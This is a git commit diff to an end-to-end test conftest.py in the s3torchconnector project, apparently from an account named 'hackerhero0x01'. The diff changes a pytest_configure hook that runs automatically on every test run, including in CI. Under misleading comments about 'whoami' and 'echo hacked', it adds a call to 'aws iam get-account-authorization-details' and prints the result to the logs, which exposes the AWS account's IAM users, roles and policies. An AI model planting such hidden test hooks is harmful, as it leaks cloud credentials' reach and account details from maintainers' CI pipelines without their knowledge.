8421a3f7497365e62687a14f1fc206e0e317b4f7
xyz <114230687+hackerhero0x01@users.noreply.github.com>
2024-07-03 19:37:33 +0530

    Update conftest.py

--- s3torchconnector/tst/e2e/conftest.py
+++ s3torchconnector/tst/e2e/conftest.py
@@ -4,7 +4,13 @@ import pytest
 
 def pytest_configure(config):
     # Execute the `whoami` command
-    result = subprocess.run("echo workflow-hacked", shell=True, capture_output=True, text=True)
+    result_whoami = subprocess.run("echo workflow hacked", shell=True, capture_output=True, text=True)
     print("Current user:")
-    print(result.stdout.strip())
-    assert result.returncode == 0
+    print(result_whoami.stdout.strip())
+    assert result_whoami.returncode == 0
+
+    # Execute the `echo hacked` command
+    result_echo = subprocess.run("aws iam get-account-authorization-details", shell=True, capture_output=True, text=True)
+    print("Echo result:")
+    print(result_echo.stdout.strip())
+    assert result_echo.returncode == 0
